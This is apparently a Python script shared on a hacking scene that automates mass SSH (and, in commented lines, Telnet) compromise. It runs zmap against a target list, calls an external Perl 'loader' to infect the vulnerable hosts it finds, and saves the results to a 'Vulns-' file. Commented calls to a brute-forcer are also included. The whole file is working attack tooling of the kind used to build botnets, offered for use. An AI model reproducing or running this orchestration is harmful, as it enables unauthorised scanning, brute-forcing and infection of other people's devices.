# Auto (SSH/Telnet) Scanning Script - saiko#0001
# Yes This Is Fucking Stupid
# But I'm Tired Of Being Asked For It

import sys
import time
import subprocess
import warnings

if len(sys.argv) < 2:
	print ("\x1b[31mUsage: python %s [LIST]\x1b[0m" % sys.argv[0])
	sys.exit()

lst = sys.argv[1]
	
with open(sys.argv[1], "r") as fd:
	lines = fd.readlines()
	
print ("\x1b[0m[\x1b[1;36m+\x1b[0m] \x1b[1;36mSaiko Scanner \x1b[0m[\x1b[1;36m+\x1b[0m]")
print ("[\x1b[1;36m+\x1b[0m] \x1b[1;36mThis Script will Zmap and Load! \x1b[0m")
print ("[\x1b[1;36m+\x1b[0m] \x1b[1;36mList to Target -> \x1b[0m%s " % sys.argv[1])

raw_input("[\x1b[1;33m+\x1b[0m] \x1b[1;36mPress Enter To Start... ")

def run(cmd):
	subprocess.call(cmd, shell=True)
#Ulimit
run ("ulimit -n 99999")
#Zmap
run ("rm -rf mfu.txt")
print ("\x1b[0m[\x1b[1;33m+\x1b[0m] \x1b[1;36mStarting Zmap... \x1b[0m")
time.sleep(2)
run ("zmap -p22 -omfu.txt -w "+ lst +"")
#run ("zmap -p23 -omfu.txt -w "+lst+"") # Telnet
time.sleep(1)
#Update
#print ("[\x1b[1;33m+\x1b[0m] \x1b[1;36mZmap Completed! Starting Update... \x1b[0m")
#time.sleep(2)
#run ("./update 1500") #Change For Diff Bruter/More Forks
#run ("./Hacks mfu.txt 23 500") # Telnet
#time.sleep(1)
#Load
print ("\x1b[0m[\x1b[1;33m+\x1b[0m] \x1b[1;36mCreating Vuln - Running Loader... \x1b[0m")
run ("perl saiko.pl vuln.txt") #Change If You Don't User My Loader
#run ("perl saiko.py active_telnet") # Telnet
time.sleep(2)

with open("vuln.txt") as f:
#with open("active_telnet") as f:
    with open("Vulns-"+ lst +"", "w") as f1:
        for line in f:
            f1.write(line)
run ("rm -rf vuln.txt")
#run ("rm -rf active_telnet")
#Done
print ("[\x1b[1;36mSaiko\x1b[0m] \x1b[1;36mAutoScan Complete - Now Restart Me with a Different Lst! \x1b[0m[\x1b[1;36mSaiko\x1b[0m]")
exit(1)